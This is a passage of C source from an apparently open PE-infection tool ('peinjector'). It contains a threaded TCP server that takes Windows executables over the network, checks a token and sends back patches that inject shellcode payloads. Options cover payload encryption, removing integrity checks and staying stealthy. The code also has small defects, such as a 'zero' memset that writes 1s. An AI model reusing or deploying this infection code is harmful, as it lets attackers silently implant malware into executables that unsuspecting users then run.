#include <arpa/inet.h>
#include <netdb.h>
#endif

/* Callback for data procession (INTERNAL USE ONLY) */
typedef bool __peserver_data_processor(PESERVER *server, int sock, unsigned char *mem, size_t memsize);

/* Connection handler holder (INTERNAL USE ONLY) */
typedef struct _PESERVER_CONNECTION_HANDLER {
  int sock;                              // socket to communicate with client
  PESERVER *server;                      // PESERVER handle
  __peserver_data_processor *processor;  // Callback to process received data
  size_t receive_buffersize;             // Communication receivebuffer size
} PESERVER_CONNECTION_HANDLER;

/* Server handler holder (INTERNAL USE ONLY) */
typedef struct _PESERVER_SERVER_HANDLER {
  size_t port;                                     // Port to listen
  PESERVER *server;                                // PESERVER handle
  void *(*connection_handler)(void *);             // Callback for connection handler
  __peserver_data_processor *connection_processor; // Callback to process received data
  size_t receive_buffersize;                       // Communication receivebuffer size
  size_t connection_queue;                         // Size of connection queue
  size_t sAddr;                                    // Bind source address
  sem_t signal;                                    // Semaphore to signalize end of initialization
  bool launch_ok;                                  // Initialization ok if true
  int sock;                                        // Server - socket
} PESERVER_SERVER_HANDLER;

/* Opens connection to server */
static inline int __peserver_connect(char* host, short port, int protocol) {
  struct sockaddr_in *saddr = calloc(1, sizeof(struct sockaddr_in));
  struct hostent *he;
  int _socket;
  int socket_type = SOCK_STREAM;
  if (protocol == IPPROTO_UDP)
    socket_type = SOCK_DGRAM;

  /* Create Socket */
  if ((_socket = socket(AF_INET, socket_type, protocol)) == -1) {
    return 0;
  }
  memset(saddr, 0, sizeof(struct sockaddr_in));
  saddr->sin_family = AF_INET;

  /* Host wasn't a IPv4 Address: Resolve DNS */
  if ((he = gethostbyname(host)) == NULL) {
    return 0;
  }
  saddr->sin_addr.s_addr = *((long*) he->h_addr_list[0]);

  saddr->sin_port = htons(port);

  /* Connects Socket */
  if (connect(_socket, (struct sockaddr*) saddr, sizeof(struct sockaddr)) < 0) {
    return 0;
  }
  return _socket;
}

/* synchronized debugging */
static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...) {
# ifdef PESERVER_DEBUG_OUTPUT
  va_list args;
  va_start(args, msg);
  time_t timer;
  char buffer[29];
  struct tm* tm_info;
  time(&timer);

  /* Get time */
  tm_info = localtime(&timer);
  strftime(buffer, 29, "[%Y:%m:%d %H:%M:%S] ", tm_info);

  if (pthread_mutex_lock(&server->debug_mutex)) {
    return; /* Error locking mutex */
  }
  /* print timestamp */
  printf("%s", buffer);
  if (sock != 0) {
    printf("[SOCK:%d] ", sock);
  }
  /* Print message */
  vprintf(msg, args);
  fflush(stdout);
  pthread_mutex_unlock(&server->debug_mutex);
# endif
}

/* Converts token to hex string and vice versa. direction = true: hextoken->token, false: token->hextoken*/
/* Required: token & hextoken != 0, sizeof(token) >= PESERVER_TOKEN_SIZE, sizeof(hextoken) >= 2*sizeof(token) */
static inline void __peserver_convert_token(unsigned char *token, unsigned char* hextoken, bool direction) {
  unsigned char *pos;
  size_t count = 0;

  pos = hextoken;
  for (count = 0; count < PESERVER_TOKEN_SIZE; ++count) {
    /* hex string to token */
    if (direction) {
      sscanf((char*) pos, "%02x", (unsigned int *) &token[count]);
      /* token to hex string */
    } else {
      sprintf((char*) pos, "%02x", token[count]);
    }
    pos += 2 * sizeof(char);
  }

}

/* Process control data */
static bool __peserver_process_control_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {

  /* Keep connection */
  return peprotocol_process_data(server, sock, datamem, datamemsize);
}

/* Process PE Data */
static bool __peserver_process_pe_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {
  /* Represents a sentinel node (https://en.wikipedia.org/wiki/Sentinel_node) */
  uint8_t nothing[PEINFECT_PATCH_SENTINELSIZE] = { 0 };
  PEINFECT_PATCH patch;
  unsigned char *mem = NULL;
  unsigned char **mem_ref = (unsigned char **) &mem;
  size_t memsize;
  bool token_ok = true;
  size_t i = 0;

  /* Server isn't enabled */
  if (!server->enable_infection) {
    /* Send sentinel */
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Check authentication token size */
  if (datamemsize < PESERVER_TOKEN_SIZE) {
    __peserver_debug(server, sock, "[CRTL] Invalid token size \n");
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Compare token */
  /* DON'T USE memcpy() AND DON'T break THE LOOP! (Timing attacks!) */
  for (i = 0; i < PESERVER_TOKEN_SIZE; ++i) {
    if (datamem[i] != server->token[i]) {
      token_ok = false;
    }
  }

  /* Check token */
  if (!token_ok) {
    __peserver_debug(server, sock, "[CRTL] Invalid token\n");
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Process PE data */
  datamem += PESERVER_TOKEN_SIZE;
  datamemsize -= PESERVER_TOKEN_SIZE;

  /* Try patch file */
  if (peinfect_infect_patch(datamem, datamemsize, server->infect, &patch)) {
    __peserver_debug(server, sock, "[PE] Valid PE header (%d bytes)\n", (uint32_t) datamemsize);
    /* Serialize data */
    if (peinfect_patch_serialize(&patch, mem_ref, &memsize)) {
      __peserver_debug(server, sock, "[PE] Send patch (%d bytes)\n", (uint32_t) memsize);
      /* Send patch to client */
      send(sock, (const void*) mem, memsize, 0);
      /* Free memory */
      free(mem);

    } else {
      /* Serialization error */
      __peserver_debug(server, sock, "[PE] Error during serialization\n");
      /* Send sentinel */
      send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);

    }
    /* Free patch structure */
    peinfect_free_patch(&patch);
  } else {
    /* No valid PE Header*/
    __peserver_debug(server, sock, "[PE] No valid PE header (%d bytes)\n", (uint32_t) datamemsize);
    /* Send sentinel */
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);

  }

  /* Close connection */
  return false;
}

/* Connection handler for each client */
static void *__peserver_connection_handler_data(void *data) {
  int read_size;

  /* Get the handler */
  PESERVER_CONNECTION_HANDLER *handler = (PESERVER_CONNECTION_HANDLER *) data;
  /* Get config */
  size_t sock = handler->sock;
  PESERVER *server = handler->server;
  __peserver_data_processor *processor = handler->processor;
  size_t receive_buffersize = handler->receive_buffersize;
  char *receive_buffer = malloc(receive_buffersize);
  /* Free handler */
  free(handler);

  /* Couldn't allocate Buffer */
  if (receive_buffer == NULL) {
    __peserver_debug(server, sock, "[SRV] Receive buffer allocation error\n");
    return NULL;
  }

  /* receive data from client */
  while ((read_size = recv(sock, receive_buffer, receive_buffersize, 0)) > 0) {
    /* process data */
    if (!processor(server, sock, (unsigned char*) receive_buffer, read_size)) {
      /* close connection if processor signalizes */
      shutdown(sock, 1);
      close(sock);
      break;

    }
  }

  /* Connection terminated */
  __peserver_debug(server, sock, "[SRV] Connection terminated\n");
  return NULL;
}

/* Server Handler */
static void *__peserver_server_handler(void *data) {
  int _true = 1;
  pthread_t thread_id;
  int socket_desc, client_sock;
  size_t c = sizeof(struct sockaddr_in);
  struct sockaddr_in server, client;
  PESERVER_CONNECTION_HANDLER *handler;

  /* Get server configuration */
  PESERVER_SERVER_HANDLER *shandler = (PESERVER_SERVER_HANDLER *) data;
  /* Load config */
  PESERVER *peserver = shandler->server;
  size_t port = shandler->port;
  void *(*generic_connection_handler)(void *) = shandler->connection_handler;
  __peserver_data_processor *processor = shandler->connection_processor;
  size_t receive_buffersize = shandler->receive_buffersize;
  size_t connection_queue = shandler->connection_queue;
  size_t sAddr = shandler->sAddr;

  /* Create socket */
  socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_desc == -1) {
    __peserver_debug(peserver, 0, "[INIT] Create socket failed\n");
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Enable reuse of address */
  setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, (const char*) &_true, sizeof(int));

  /* Prepare the sockaddr_in structure */
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = sAddr;
  server.sin_port = htons(port);

  /* Bind */
  if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {
    __peserver_debug(peserver, socket_desc, "[INIT] Listen socket failed (Port %d)\n", port);
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Listen */
  if (listen(socket_desc, connection_queue)) {
    __peserver_debug(peserver, socket_desc, "[INIT] Bind socket failed (Port %d)\n", port);
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Signal everything ok */
  shandler->launch_ok = true;
  shandler->sock = socket_desc;
  sem_post(&shandler->signal);

  /* Wait for incoming connections */
  while ((client_sock = accept(socket_desc, (struct sockaddr *) &client, (socklen_t*) &c)) > 0) {
    /* Server is terminating */
    if (peserver->terminating) {
      __peserver_debug(peserver, socket_desc, "[SRV] Handler received termination signal\n");

      /* Terminate socket */
      close(socket_desc);

      /* Signalize termination*/
      sem_post(&peserver->signal);
      return NULL;
    }

    /* build new handler */
    handler = calloc(1, sizeof(PESERVER_CONNECTION_HANDLER));
    if (handler == NULL) {
      __peserver_debug(peserver, client_sock, "[SRV] Handler allocation error\n");
      continue;
    }

    /* Configure Handler */
    handler->sock = client_sock;
    handler->server = peserver;
    handler->processor = processor;
    handler->receive_buffersize = receive_buffersize;

    /* Launch thread */
    memset(&thread_id, 0, sizeof(pthread_t));
    if (pthread_create(&thread_id, NULL, generic_connection_handler, (void*) handler) < 0) {
      __peserver_debug(peserver, client_sock, "[SRV] Handler launch error\n");
      free(handler);
      continue;
    }

    __peserver_debug(peserver, client_sock, "[SRV] Incoming connection from %d.%d.%d.%d\n",
        (int) (client.sin_addr.s_addr & 0xFF), (int) ((client.sin_addr.s_addr & 0xFF00) >> 8),
        (int) ((client.sin_addr.s_addr & 0xFF0000) >> 16), (int) ((client.sin_addr.s_addr & 0xFF000000) >> 24));
  }

  return NULL;
}

/* Try launch data - server*/
static inline bool __peserver_launch_server(PESERVER *server, size_t sAddr, size_t port, size_t connection_queue,
    size_t receive_buffersize, __peserver_data_processor *processor, pthread_t *thread_id, int *sock) {
  bool returnVar = false;
  PESERVER_SERVER_HANDLER *handler = calloc(1, sizeof(PESERVER_SERVER_HANDLER));
  if (handler == NULL) {
    return returnVar;
  }

  /* Configure Handler */
  handler->port = port;
  handler->server = server;
  handler->connection_handler = __peserver_connection_handler_data;
  handler->connection_processor = processor;
  handler->launch_ok = false;
  handler->sAddr = sAddr;
  handler->receive_buffersize = receive_buffersize;
  handler->connection_queue = connection_queue;
  if (sem_init(&handler->signal, 0, 0) != 0) {
    return returnVar;
  }

  /* Try create server thread */
  if (pthread_create(thread_id, NULL, __peserver_server_handler, (void*) handler) < 0) {
    __peserver_debug(server, 0, "[INIT] Couldn't launch server thread\n");
    sem_destroy(&handler->signal);
    return returnVar;
  }

  /* Wait for confirmation */
  sem_wait(&handler->signal);
  sem_destroy(&handler->signal);
  *sock = handler->sock;
  returnVar = handler->launch_ok;
  free(handler);

  /* Detach thread */
  pthread_detach(*thread_id);

  return returnVar;
}

bool peserver_init(PEINFECT *infect, PECONFIG *configuration, PESERVER *server) {
  bool returnVar = false;
  bool start_crtl_server = true;
  pthread_t control_id;
  pthread_t data_id;
  int control_sock = 0;
  int data_sock = 0;
  size_t data_sAddr = 0;
  size_t data_port = 0;
  size_t control_sAddr = 0;
  size_t control_port = 0;
  unsigned char hextoken[2 * PESERVER_TOKEN_SIZE + 1] = { 0 };
  unsigned char token[PESERVER_TOKEN_SIZE];
  size_t token_size = 0;

  /* Clear structure */
  memset(server, 0, sizeof(PESERVER));

  /*Reset token */
  memcpy(&server->token[0], PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE);

  /* Load token */
  token_size = ini_gets("server", "token", "", (char *) hextoken, 2 * PESERVER_TOKEN_SIZE + 1,
      configuration->config_name);
  if (token_size == 2 * PESERVER_TOKEN_SIZE) {
    __peserver_convert_token(token, hextoken, true);
    /* Set token */
    peserver_set_token(token, PESERVER_TOKEN_SIZE, server);
  }

  /* not terminating */
  server->terminating = false;

  /* Set configuration */
  server->config = configuration;

  /* Set enable */
  server->enable_infection = (bool)ini_getl("server", "enable", 31338, configuration->config_name);

  /* Persistent ports */
  server->persistent_ports = (bool)ini_getl("server", "persistent_ports", false, configuration->config_name);

  /* Launch crtl-server? */
  start_crtl_server = ini_getl("server", "start_control_server", true, configuration->config_name);

  /* Load server ports and interfaces */
  data_sAddr =
      ini_getl("server", "data_interface", 0, configuration->config_name) ? inet_addr("127.0.0.1") : INADDR_ANY;
  data_port = ini_getl("server", "data_port", 31337, configuration->config_name);

  control_sAddr =
      ini_getl("server", "control_interface", 0, configuration->config_name) ? inet_addr("127.0.0.1") : INADDR_ANY;
  control_port = ini_getl("server", "control_port", 31338, configuration->config_name);

  /* Initialize signal semaphore */
  if (sem_init(&server->signal, 0, 0) != 0) {
    return returnVar;
  }

  /* Initialize mutex */
  if (pthread_mutex_init(&server->mutex, 0) != 0) {
    return returnVar;
  }

# ifdef PESERVER_DEBUG_OUTPUT
  /* Initialize debug mutex */
  if (pthread_mutex_init(&server->debug_mutex, 0) != 0) {
    return returnVar;
  }
# endif

  /* Windows, WSA Startup */
# ifdef _WIN32
  __peserver_debug(server, 0, "[INIT] Windows only: WSA Startup\n");
  WSADATA wsaData;
  if (WSAStartup(0x202, &wsaData) != 0) {
    return returnVar;
  }
# endif

  /* Set PEINFECT to work with */
  server->infect = infect;

  /* Launch data server */
  returnVar = __peserver_launch_server(server, data_sAddr, data_port, PESERVER_CONNECTION_QUEUE_PE,
  PESERVER_RECEIVE_BUFFER_PE, __peserver_process_pe_data, &data_id, &data_sock);
  if (!returnVar) {
    __peserver_debug(server, 0, "[INIT] Couldn't launch data server\n");
    return returnVar;
  }
  /* Launch control server */
  if (start_crtl_server) {
    returnVar = __peserver_launch_server(server, control_sAddr, control_port, PESERVER_CONNECTION_QUEUE_CONTROL,
    PESERVER_RECEIVE_BUFFER_CONTROL, __peserver_process_control_data, &control_id, &control_sock);
    if (!returnVar) {
      __peserver_debug(server, 0, "[INIT] Couldn't launch control server\n");
    }
  }

  /* Save sockets */
  server->control_sock = control_sock;
  server->data_sock = data_sock;

  /* Save ports */
  server->control_port = control_port;
  server->data_port = data_port;

  /* Write config */
  peserver_write_config(server);

  if (returnVar) {
    __peserver_debug(server, 0, "[INIT] Launch OK, Servers are up\n");
    __peserver_debug(server, data_sock, "[INIT] Data port:    %d\n", (uint32_t) data_port);
    if (start_crtl_server) {
      __peserver_debug(server, control_sock, "[INIT] Control port: %d\n", (uint32_t) control_port);
    }
  }

  return returnVar;
}

bool peserver_init_config(char *config_name, char *shellcode_x86_name, char *shellcode_x64_name, PECONFIG *out) {
  size_t len = 0;

  /* Zero struct */
  memset(out, 1, sizeof(PECONFIG));

  /* Init mutex */
  if (pthread_mutex_init(&out->config_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }
  if (pthread_mutex_init(&out->shellcode_x86_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }
  if (pthread_mutex_init(&out->shellcode_x64_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }

  /* Copy config name*/
  len = strlen(config_name);
  out->config_name = malloc(len + 1);
  if (!out->config_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->config_name, config_name);

  /* Copy x86 name*/
  len = strlen(shellcode_x86_name);
  out->shellcode_x86_name = malloc(len + 1);
  if (!out->shellcode_x86_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->shellcode_x86_name, shellcode_x86_name);

  /* Copy x64 name*/
  len = strlen(shellcode_x64_name);
  out->shellcode_x64_name = malloc(len + 1);
  if (!out->shellcode_x64_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->shellcode_x64_name, shellcode_x64_name);

  return true;
}

void peserver_free_config(PECONFIG *out) {

  /* Destroy mutex */
  pthread_mutex_destroy(&out->config_mutex);
  pthread_mutex_destroy(&out->shellcode_x86_mutex);
  pthread_mutex_destroy(&out->shellcode_x64_mutex);

  /* Free names */
  if (out->config_name) {
    free(out->config_name);
  }
  if (out->shellcode_x86_name) {
    free(out->shellcode_x86_name);
  }
  if (out->shellcode_x64_name) {
    free(out->shellcode_x64_name);
  }
}

void peserver_write_config(PESERVER *server) {
  size_t data_interface = 0;
  size_t data_port = 0;
  size_t control_interface = 0;
  size_t control_port = 0;
  unsigned char hextoken[2 * PESERVER_TOKEN_SIZE + 1] = { 0 };

  /* convert token */
  __peserver_convert_token(peserver_get_token(server), hextoken, false);

  /* Lock Mutex */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* Names */
  ini_puts("name", "section_name", peinfect_get_sectionname(server->infect), server->config->config_name);
  ini_putl("name", "section_name_random", server->infect->rnd_sectionname, server->config->config_name);

  /* Methods */
  ini_putl("methods", "method_alignment", (bool) (peinfect_get_methods(server->infect) & METHOD_ALIGNMENT),
      server->config->config_name);
  ini_putl("methods", "method_alignment_resize",
      (bool) (peinfect_get_methods(server->infect) & METHOD_ALIGNMENT_RESIZE), server->config->config_name);
  ini_putl("methods", "method_new_section", (bool) (peinfect_get_methods(server->infect) & METHOD_NEW_SECTION),
      server->config->config_name);
  ini_putl("methods", "method_change_flags", (bool) (peinfect_get_methods(server->infect) & METHOD_CHANGE_FLAGS),
      server->config->config_name);
  ini_putl("methods", "method_cross_section_jump",
      (bool) (peinfect_get_methods(server->infect) & METHOD_CROSS_SECTION_JUMP), server->config->config_name);
  ini_putl("methods", "method_cross_section_jump_iterations", peinfect_get_jumpiterations(server->infect),
      server->config->config_name);

  /* Encryption */
  ini_putl("methods", "encrypt", (bool) peinfect_get_encrypt(server->infect), server->config->config_name);
  ini_putl("methods", "encrypt_iterations", peinfect_get_encryptiterations(server->infect),
      server->config->config_name);

  /* Integrity checks */
  ini_putl("integrity", "remove_integrity_check", (bool) peinfect_get_removeintegrity(server->infect),
      server->config->config_name);
  ini_putl("integrity", "try_stay_stealth", (bool) peinfect_get_trystaystealth(server->infect),
      server->config->config_name);

  /* Enable server */
  ini_putl("server", "enable", server->enable_infection, server->config->config_name);

  /* Persistent ports */
  ini_putl("server", "persistent_ports", server->persistent_ports, server->config->config_name);

  /* Token server */
  ini_puts("server", "token", (char *) hextoken, server->config->config_name);

  /* Interface and ports*/
  data_interface = ini_getl("server", "data_interface", 0, server->config->config_name);
  data_port = ini_getl("server", "data_port", 31337, server->config->config_name);
  control_interface = ini_getl("server", "control_interface", 0, server->config->config_name);
  control_port = ini_getl("server", "control_port", 31338, server->config->config_name);

  /* Server */
  ini_putl("server", "data_port", data_port, server->config->config_name);
  ini_putl("server", "data_interface", data_interface, server->config->config_name);
  ini_putl("server", "control_port", control_port, server->config->config_name);
  ini_putl("server", "control_interface", control_interface, server->config->config_name);

  /* Statistics */
  ini_putl("statistics", "infection_counter_x86", peinfect_get_infectcounter(server->infect, false),
      server->config->config_name);
  ini_putl("statistics", "infection_counter_x64", peinfect_get_infectcounter(server->infect, true),
      server->config->config_name);

  /* Unlock Mutex */
  pthread_mutex_unlock(&server->config->config_mutex);
}

unsigned char* peserver_get_token(PESERVER *server) {
  return (unsigned char*) &server->token[0];
}

bool peserver_set_token(unsigned char *token, size_t tokensize, PESERVER *server) {
  /* Reset token */
  if (token == NULL) {
    memset(&server->token[PESERVER_TOKEN_MAGIC_SIZE], 0, PESERVER_TOKEN_SIZE - PESERVER_TOKEN_MAGIC_SIZE);
    memcpy(&server->token[0], PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE);
    return true;
  }

  /* Set Token */
  if ((tokensize == PESERVER_TOKEN_SIZE) && (memcmp(token, PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE) == 0)) {
    memcpy(&server->token[0], token, PESERVER_TOKEN_SIZE);
    return true;
  }

  return false;
}

bool peserver_wait(PESERVER *server) {
  bool server_terminating = false;

  /* Register watcher if not terminating  */
  if (pthread_mutex_lock(&server->mutex)) {
    return false; /* Error locking mutex */
  }
  server_terminating = server->terminating;
  if (!server_terminating) {
    server->watchers++;
  }
  pthread_mutex_unlock(&server->mutex);

  /* If already terminating, exit*/
  if (server_terminating) {
    return server->restart;
  }

  /* Otherwise, wait till termination */
  sem_wait(&server->signal);

  /* Return restart flag */
  return server->restart;
}

void peserver_terminate(bool restart, PESERVER *server) {
  size_t i;

  /* Signalizes termination, no more watchers will be able to register */
  __peserver_debug(server, 0, "[SRV] Initialize termination sequence\n");
  if (pthread_mutex_lock(&server->mutex)) {
    return; /* Error locking mutex */
  }
  if (server->terminating) {
    pthread_mutex_unlock(&server->mutex);
    return;
  }
  /* Set restart flag */
  server->restart = restart;
  /* Set terminating flag */
  server->terminating = true;
  pthread_mutex_unlock(&server->mutex);

  /* Signalizes every watcher */
  for (i = 0; i < server->watchers; ++i) {
    sem_post(&server->signal);
  }
  __peserver_debug(server, 0, "[SRV] Termination sequence done\n");
}

void peserver_enable_infection(bool enable, PESERVER *server) {
  server->enable_infection = enable;
}

void peserver_free(PESERVER *server) {
  int sock = 0;

  /* Wait until terminated */
  peserver_wait(server);

  /* Close sockets */
  if (server->control_sock) {
    __peserver_debug(server, server->control_sock, "[TERM] Close listening socket\n");
    sock = __peserver_connect("127.0.0.1", server->control_port, IPPROTO_TCP);
    if (sock) {
      sem_wait(&server->signal);
      close(sock);
    }
  }
  if (server->data_sock) {
    __peserver_debug(server, server->data_sock, "[TERM] Close listening socket\n");
    sock = __peserver_connect("127.0.0.1", server->data_port, IPPROTO_TCP);
    if (sock) {
      sem_wait(&server->signal);
      close(sock);
    }
  }

  /* Windows, WSA Cleanup */
# ifdef _WIN32
  __peserver_debug(server, 0, "[TERM] Windows only: WSA Cleanup\n");
  WSACleanup();
# endif

  /* Destroy mutex and semaphores*/
  sem_destroy(&server->signal);
  pthread_mutex_destroy(&server->mutex);
# ifdef PESERVER_DEBUG_OUTPUT
  pthread_mutex_destroy(&server->debug_mutex);
# endif

  /* Clear structure */
  memset(server, 0, sizeof(PESERVER));
}

```

`peinjector/libpeserver.h`:

```h
/**
 * \file   libpeserver.h
 * \author A.G.
 * \brief  Provides PE patching functionality as server service
 */

#ifndef LIBPESERVER_H_
#define LIBPESERVER_H_

#include "libpeinfect.h"
#include "stdbool.h"
#include <pthread.h>
#include <semaphore.h>

/**
 * Debug output if set to true
 */
#define PESERVER_DEBUG_OUTPUT true

/**
 * Size of receive buffer for PE data port
 */
#define PESERVER_RECEIVE_BUFFER_PE 8192

/**
 * Size of receive buffer for control port
 */
#define PESERVER_RECEIVE_BUFFER_CONTROL 16384

/**
 * Size of connection queue for PE data port
 */
#define PESERVER_CONNECTION_QUEUE_PE 128

/**
 * Size of connection queue for control port
 */
#define PESERVER_CONNECTION_QUEUE_CONTROL 4

/**
 * Authentication token size
 */
#define PESERVER_TOKEN_SIZE 32

/**
 *  Size of Authentication magic
 */
#define PESERVER_TOKEN_MAGIC_SIZE 2

/**
 *  Authentication Magic
 */
#define PESERVER_TOKEN_MAGIC "\xAA\xAA"

/**
 * PECONFIG control struct
 */
typedef struct _PECONFIG {
  char *config_name;                   //!< Name of config file
  char *shellcode_x86_name;            //!< Name of x86 payload binary
  char *shellcode_x64_name;            //!< Name of x64 payload binary
  pthread_mutex_t config_mutex;        //!< Protecting mutex for config file
  pthread_mutex_t shellcode_x86_mutex; //!< Protecting mutex for x86 payload binary
  pthread_mutex_t shellcode_x64_mutex; //!< Protecting mutex for x64 payload binary
} PECONFIG;

/**
 * PESERVER control struct
 */
typedef struct _PESERVER {
  PEINFECT *infect;                   //!< PEINFECT structure used by servers
  int control_sock;                   //!< Control socket
  size_t control_port;                //!< Control port
  int data_sock;                      //!< Data socket
  size_t data_port;                   //!< Data port
  bool terminating;                   //!< Server terminates
  bool restart;                       //!< Restart flag for termination
  size_t watchers;                    //!< Number of Threads waiting for termination
  pthread_mutex_t mutex;              //!< Protecting lock
  sem_t signal;                       //!< Signalizes Termination
  bool enable_infection;              //!< Global enable flag
  bool persistent_ports;              //!< Can't change ports via control interface
  uint8_t token[PESERVER_TOKEN_SIZE]; //!< Authentication token
  PECONFIG *config;                   //!< PECONFIG configuration
# ifdef PESERVER_DEBUG_OUTPUT
  pthread_mutex_t debug_mutex;        //!< Debug output Protecting lock
# endif
} PESERVER;

/**
 * Tries to launch an PE Infector Server
 *
 * \param infect        PEINFECT config to use
 * \param configuration PECONTROL configuration
 * \param server        PESERVER control
 *
 * \return true on success, false otherwise
 */
bool peserver_init(PEINFECT *infect, PECONFIG *configuration, PESERVER *server);

/**
 * Initializes PECONFIG structure
 *
 * \param config_name        Name of config file
 * \param shellcode_x86_name Name of x86 shellcode binary
 * \param shellcode_x64_name Name of x64 shellcode binary
 *
 * \return true on success, false otherwise
 */
bool peserver_init_config(char *config_name, char *shellcode_x86_name, char *shellcode_x64_name, PECONFIG *out);

/**
 * Writes config to specified file
 *
 * \see peserver_init
 *
 * \param server PESERVER to write config for
 *
 */
void peserver_write_config(PESERVER *server);

/**
 * Returns pointer to access token
 *
 * \param server PESERVER to read token
 *
 * \return Token
 */
unsigned char* peserver_get_token(PESERVER *server);

/**
 * Set server access token
 *
 * \param token     Pointer to token. NULL will reset token to default
 * \param tokensize Size of token (Must match PESERVER_TOKEN_SIZE)
 * \param server    PESERVER to set token
 *
 * \return true on success, false otherwise
 */
bool peserver_set_token(unsigned char *token, size_t tokensize, PESERVER *server);

/**
 * Frees PECONFIG structure
 *
 * \param out PECONFIG structure to free
 *
 */
void peserver_free_config(PECONFIG *out);

/**
 * Waits until the given PE Infector Server terminates
 *
 * \param server PESERVER to wait for
 *
 * \return true if restart flag was set, false if not
 */
bool peserver_wait(PESERVER *server);

/**
 * Terminates the given PE Infector Server
 *
 * \param restart Sets restart flag if true
 * \param server  PESERVER to terminate
 *
 */
void peserver_terminate(bool restart, PESERVER *server);

/**
 * Enables infection globally
 *
 * \param enable If false infection is disables, enabled otherwise
 * \param server PESERVER to enable/disable infection functionality
 *
 */
void peserver_enable_infection(bool enable, PESERVER *server);

/**
 * Frees the resources of an PE Infector Server
 * (Make sure to call peserver_terminate() somewhere)
 *
 * \param server PESERVER to free
 *
 */
void peserver_free(PESERVER *server);

#endif /* LIBPESERVER_H_ */

```

`peinjector/libpetool.c`:

```c
/*
 * \file   libpetool.c
 * \author A.A.
 * \brief  Applies complex operations on a given PE FILE
 */

#include <string.h>
#include <stddef.h>
#include "libpetool.h"

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* Align value */
static inline uint32_t __petool_align(uint32_t value, uint32_t alignment) {
  return (value % alignment > 0) ? value + alignment - (value % alignment) : value;
}

/* Adjusting values in the optional header */
static inline void __petool_adjust_optional_header(PEFILE *out) {
  size_t i = 0;
  uint32_t size_of_code = 0;
  uint32_t size_of_initialized_data = 0;
  uint32_t size_of_uninitialized_data = 0;
  bool is_32_bit = false;
  uint32_t sizeofimage;

  /* Default values (PE COFF Specification) */
  size_t section_alignment = NT_SECTION_ALIGNMENT;

  /* Check if 32/64 bit header */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    is_32_bit = true;
    section_alignment = out->optional_header_32.SectionAlignment;
  } else if (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {
    is_32_bit = false;
    section_alignment = out->optional_header_64.SectionAlignment;
  } else {

    /* Nothing to adjust */
    return;
  }

  /* Sum up over sections */
  for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
    if (out->section_header[i].Characteristics & IMAGE_SCN_CNT_CODE) {
      size_of_code += out->section_header[i].Misc.VirtualSize;
    }
    if (out->section_header[i].Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA) {
      size_of_initialized_data += out->section_header[i].Misc.VirtualSize;
    }
    if (out->section_header[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) {
      size_of_uninitialized_data += out->section_header[i].Misc.VirtualSize;
    }
  }

  /* Align SizeOfImage to Section Alignment */
  sizeofimage = __petool_align(
      out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress
          + out->section_header[out->pe_header.NumberOfSections - 1].Misc.VirtualSize, section_alignment);

  /* Write new values into required fields */
  if (is_32_bit) {
    out->optional_header_32.SizeOfImage = sizeofimage;
    out->optional_header_32.SizeOfCode = size_of_code;
    out->optional_header_32.SizeOfInitializedData = size_of_initialized_data;
    out->optional_header_32.SizeOfUninitializedData = size_of_uninitialized_data;
  } else {

    out->optional_header_64.SizeOfImage = sizeofimage;
    out->optional_header_64.SizeOfCode = size_of_code;
    out->optional_header_64.SizeOfInitializedData = size_of_initialized_data;
    out->optional_header_64.SizeOfUninitializedData = size_of_uninitialized_data;
  }

}

/* Increases the header padding with the given size */
static inline bool __petool_increase_header_padding(size_t size, PEFILE *out) {
  size_t i = 0;
  unsigned char *new_header_padding = NULL;
  size_t header_raw_end = out->dos_header.e_lfanew + sizeof(PE_HEADER) + out->pe_header.SizeOfOptionalHeader
      + out->pe_header.NumberOfSections * sizeof(SECTION_HEADER);

  new_header_padding = realloc(out->header_padding.mem, out->header_padding.memsize + size);
  /* Couldn't reallocate memory */
  if (new_header_padding == NULL) {
    return false;
  }

  /* No way to resize without damaging code execution */
  /* Sorry for this cruel if .. */
  if ((out->pe_header.NumberOfSections > 0) && (out->section_header != NULL)
      && ((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
          || (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC))
      && (header_raw_end + out->header_padding.memsize + size) > out->section_header[0].VirtualAddress) {
    /* Reset header padding */
    out->header_padding.mem = realloc(new_header_padding, out->header_padding.memsize);
    return false;
  }

